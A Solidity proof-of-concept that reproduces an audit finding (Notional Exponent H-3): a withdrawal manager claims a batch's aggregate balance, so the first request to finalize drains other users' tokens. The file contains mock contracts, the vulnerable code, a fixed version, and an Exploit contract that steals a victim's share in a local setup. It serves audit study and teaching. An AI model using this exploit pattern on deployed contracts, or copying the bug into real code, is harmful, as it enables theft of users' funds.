// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// =============================================================================
//  Notional Exponent H-3 — DineroWithdrawRequestManager token overwithdrawal
//  via batch-ID overlap
//  (sherlock 2025-06-notional-exponent, withdraws/Dinero.sol @ main).
//
//  A request encodes a batch RANGE [initialBatchId, finalBatchId]. On finalize,
//  the manager loops the range and claims `upxETH.balanceOf(this, i)` for each
//  batch i — i.e. the manager's ENTIRE aggregate balance of that batch, summed
//  across ALL requests that landed in it, NOT this request's share. So when two
//  requests overlap on a batch, the FIRST finalizer drains the whole batch,
//  including the other request's tokens. _initiateWithdrawImpl / _finalizeWithdrawImpl
//  are reproduced VERBATIM (marked @>).
// =============================================================================

/*//////////////////////////////////////////////////////////////
        pxETH — the redeemable token users withdraw
//////////////////////////////////////////////////////////////*/
contract PxETH {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
        upxETH — ERC-1155-style redemption receipt, keyed by batchId
//////////////////////////////////////////////////////////////*/
contract UpxETH {
    // balanceOf[holder][batchId]
    mapping(address => mapping(uint256 => uint256)) internal _bal;

    function balanceOf(address holder, uint256 id) external view returns (uint256) {
        return _bal[holder][id];
    }

    function mint(address to, uint256 id, uint256 amt) external {
        _bal[to][id] += amt;
    }

    function burn(address from, uint256 id, uint256 amt) external {
        _bal[from][id] -= amt;
    }
}

/*//////////////////////////////////////////////////////////////
        WETH — deposit wrap of native ETH
//////////////////////////////////////////////////////////////*/
contract WETHc {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    receive() external payable {
        balanceOf[msg.sender] += msg.value;
    }
}

interface IPirexETH {
    enum ValidatorStatus {
        None,
        Staked,
        Withdrawable,
        Dissolved,
        Slashed
    }

    function batchId() external view returns (uint256);
    function initiateRedemption(uint256 amount, address receiver, bool shouldTriggerValidatorExit) external;
    function redeemWithUpxEth(uint256 batchId, uint256 assets, address receiver) external;
    function status(bytes calldata validator) external view returns (ValidatorStatus);
    function batchIdToValidator(uint256 batchId) external view returns (bytes memory);
    function outstandingRedemptions() external view returns (uint256);
}

/*//////////////////////////////////////////////////////////////
   PirexETH double. batchId() is fixed here so both requests land in
   the SAME batch (the overlap the finding requires). initiateRedemption
   pulls pxETH and mints upxETH of the current batch to the receiver;
   redeemWithUpxEth burns upxETH and pays native ETH.
//////////////////////////////////////////////////////////////*/
contract PirexETHMock is IPirexETH {
    PxETH public immutable pxETH;
    UpxETH public immutable upxETH;
    uint256 public curBatch;

    constructor(PxETH _px, UpxETH _up, uint256 _batch) {
        pxETH = _px;
        upxETH = _up;
        curBatch = _batch;
    }

    function batchId() external view returns (uint256) {
        return curBatch;
    }

    function initiateRedemption(uint256 amount, address receiver, bool) external {
        pxETH.transferFrom(msg.sender, address(this), amount);
        upxETH.mint(receiver, curBatch, amount); // both requests mint into the same batch
    }

    function redeemWithUpxEth(uint256 _batchId, uint256 assets, address receiver) external {
        upxETH.burn(msg.sender, _batchId, assets);
        (bool ok,) = receiver.call{value: assets}("");
        require(ok, "eth send failed");
    }

    // canFinalize helpers: all validators dissolved, redemptions outstanding.
    function status(bytes calldata) external pure returns (ValidatorStatus) {
        return ValidatorStatus.Dissolved;
    }

    function batchIdToValidator(uint256) external pure returns (bytes memory) {
        return hex"01";
    }

    function outstandingRedemptions() external pure returns (uint256) {
        return type(uint128).max;
    }

    receive() external payable {}
}

/*//////////////////////////////////////////////////////////////
   DineroWithdrawRequestManager — VULNERABLE. _finalizeWithdrawImpl
   claims the aggregate per-batch balance, not the per-request share.
//////////////////////////////////////////////////////////////*/
contract DineroWithdrawRequestManager {
    uint16 internal s_batchNonce;
    uint256 internal constant MAX_BATCH_ID = type(uint120).max;

    IPirexETH public immutable PirexETH;
    UpxETH public immutable upxETH;
    PxETH public immutable pxETH;
    WETHc public immutable WETH;

    mapping(uint256 => address) public requestAccount;

    constructor(IPirexETH _pirex, UpxETH _up, PxETH _px, WETHc _weth) {
        PirexETH = _pirex;
        upxETH = _up;
        pxETH = _px;
        WETH = _weth;
    }

    function initiateWithdraw(uint256 amount) external returns (uint256 requestId) {
        pxETH.transferFrom(msg.sender, address(this), amount);
        requestId = _initiateWithdrawImpl(msg.sender, amount, "");
        requestAccount[requestId] = msg.sender;
    }

    function _initiateWithdrawImpl(address, /* account */ uint256 amountToWithdraw, bytes memory /* data */ )
        internal
        returns (uint256 requestId)
    {
        uint256 initialBatchId = PirexETH.batchId();
        pxETH.approve(address(PirexETH), amountToWithdraw);
        PirexETH.initiateRedemption(amountToWithdraw, address(this), false);
        uint256 finalBatchId = PirexETH.batchId();
        uint256 nonce = ++s_batchNonce;

        // Initial and final batch ids may overlap between requests so the nonce is used to ensure uniqueness
        require(initialBatchId < MAX_BATCH_ID);
        require(finalBatchId < MAX_BATCH_ID);
        // @> the requestId is unique (nonce), but the CLAIMING below is per-batch aggregate
        return nonce << 240 | initialBatchId << 120 | finalBatchId;
    }

    function _decodeBatchIds(uint256 requestId) internal pure returns (uint256 initialBatchId, uint256 finalBatchId) {
        initialBatchId = requestId >> 120 & MAX_BATCH_ID;
        finalBatchId = requestId & MAX_BATCH_ID;
    }

    function finalizeWithdraw(uint256 requestId) external returns (uint256 claimed) {
        (uint256 tokensClaimed, bool finalized) = _finalizeWithdrawImpl(requestAccount[requestId], requestId);
        require(finalized, "not finalized");
        WETH.transfer(requestAccount[requestId], tokensClaimed);
        return tokensClaimed;
    }

    function _finalizeWithdrawImpl(address, /* account */ uint256 requestId)
        internal
        returns (uint256 tokensClaimed, bool finalized)
    {
        finalized = canFinalizeWithdrawRequest(requestId);

        if (finalized) {
            (uint256 initialBatchId, uint256 finalBatchId) = _decodeBatchIds(requestId);

            for (uint256 i = initialBatchId; i <= finalBatchId; i++) {
                // @> BUG: claims the manager's ENTIRE balance of batch i (summed across
                // @> ALL requests in that batch), not this request's share. The first
                // @> finalizer of an overlapping batch drains the others' tokens.
                uint256 assets = upxETH.balanceOf(address(this), i);
                if (assets == 0) continue;
                PirexETH.redeemWithUpxEth(i, assets, address(this));
                tokensClaimed += assets;
            }
        }

        WETH.deposit{value: tokensClaimed}();
    }

    function canFinalizeWithdrawRequest(uint256 requestId) public view returns (bool) {
        (uint256 initialBatchId, uint256 finalBatchId) = _decodeBatchIds(requestId);
        uint256 totalAssets;

        for (uint256 i = initialBatchId; i <= finalBatchId; i++) {
            IPirexETH.ValidatorStatus st = PirexETH.status(PirexETH.batchIdToValidator(i));
            if (st != IPirexETH.ValidatorStatus.Dissolved && st != IPirexETH.ValidatorStatus.Slashed) {
                return false;
            }
            totalAssets += upxETH.balanceOf(address(this), i);
        }
        return PirexETH.outstandingRedemptions() > totalAssets;
    }

    receive() external payable {}
}

/*//////////////////////////////////////////////////////////////
   DineroFixed — mitigation: track the per-request contribution and
   claim only that amount, capped by the batch balance.
//////////////////////////////////////////////////////////////*/
contract DineroFixed {
    uint16 internal s_batchNonce;
    uint256 internal constant MAX_BATCH_ID = type(uint120).max;

    IPirexETH public immutable PirexETH;
    UpxETH public immutable upxETH;
    PxETH public immutable pxETH;
    WETHc public immutable WETH;

    mapping(uint256 => address) public requestAccount;
    mapping(uint256 => uint256) public requestAmount; // FIX: per-request contribution

    constructor(IPirexETH _pirex, UpxETH _up, PxETH _px, WETHc _weth) {
        PirexETH = _pirex;
        upxETH = _up;
        pxETH = _px;
        WETH = _weth;
    }

    function initiateWithdraw(uint256 amount) external returns (uint256 requestId) {
        pxETH.transferFrom(msg.sender, address(this), amount);
        uint256 initialBatchId = PirexETH.batchId();
        pxETH.approve(address(PirexETH), amount);
        PirexETH.initiateRedemption(amount, address(this), false);
        uint256 finalBatchId = PirexETH.batchId();
        uint256 nonce = ++s_batchNonce;
        requestId = nonce << 240 | initialBatchId << 120 | finalBatchId;
        requestAccount[requestId] = msg.sender;
        requestAmount[requestId] = amount; // FIX
    }

    function finalizeWithdraw(uint256 requestId) external returns (uint256 claimed) {
        (uint256 initialBatchId,) = _decode(requestId);
        claimed = requestAmount[requestId]; // FIX: only this request's share
        requestAmount[requestId] = 0;
        PirexETH.redeemWithUpxEth(initialBatchId, claimed, address(this));
        WETH.deposit{value: claimed}();
        WETH.transfer(requestAccount[requestId], claimed);
    }

    function _decode(uint256 requestId) internal pure returns (uint256 a, uint256 b) {
        a = requestId >> 120 & MAX_BATCH_ID;
        b = requestId & MAX_BATCH_ID;
    }

    receive() external payable {}
}

/*//////////////////////////////////////////////////////////////
   Victim — a second, independent depositor whose share is stolen.
//////////////////////////////////////////////////////////////*/
contract Victim {
    function initiate(DineroWithdrawRequestManager mgr, PxETH px, uint256 amount) external returns (uint256) {
        px.approve(address(mgr), amount);
        return mgr.initiateWithdraw(amount);
    }

    function finalize(DineroWithdrawRequestManager mgr, uint256 requestId) external returns (uint256) {
        return mgr.finalizeWithdraw(requestId);
    }
}

/*//////////////////////////////////////////////////////////////
   Exploit — attacker and victim each withdraw 50 pxETH into the SAME
   batch. The attacker finalizes first and drains the whole batch
   (100), stealing the victim's 50. The victim finalizes and gets 0.
//////////////////////////////////////////////////////////////*/
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d; // stolen-share sink

    uint256 internal constant DEPOSIT = 50 ether;
    uint256 internal constant BATCH = 5;

    PxETH public pxETH;
    UpxETH public upxETH;
    WETHc public weth;
    PirexETHMock public pirex;
    DineroWithdrawRequestManager public manager;
    Victim public victim;

    function run() external payable {
        pxETH = new PxETH();
        upxETH = new UpxETH();
        weth = new WETHc();
        pirex = new PirexETHMock(pxETH, upxETH, BATCH);
        manager = new DineroWithdrawRequestManager(pirex, upxETH, pxETH, weth);
        victim = new Victim();

        // Fund PirexETH with ETH to pay redemptions.
        (bool ok,) = address(pirex).call{value: 2 * DEPOSIT}("");
        require(ok, "fund");

        // Victim opens a withdrawal that lands in BATCH 5.
        pxETH.mint(address(victim), DEPOSIT);
        uint256 reqV = victim.initiate(manager, pxETH, DEPOSIT);

        // Attacker (this) opens a withdrawal that ALSO lands in BATCH 5.
        pxETH.mint(address(this), DEPOSIT);
        pxETH.approve(address(manager), DEPOSIT);
        uint256 reqA = manager.initiateWithdraw(DEPOSIT);

        // Attacker finalizes FIRST → drains the whole batch (100), incl. victim's 50.
        manager.finalizeWithdraw(reqA);

        // Victim finalizes → batch already empty → gets 0.
        victim.finalize(manager, reqV);

        // Attacker holds 100 WETH; own fair share is 50 → 50 was stolen from the victim.
        uint256 stolen = weth.balanceOf(address(this)) - DEPOSIT;
        weth.transfer(SINK, stolen);
    }

    receive() external payable {}
}
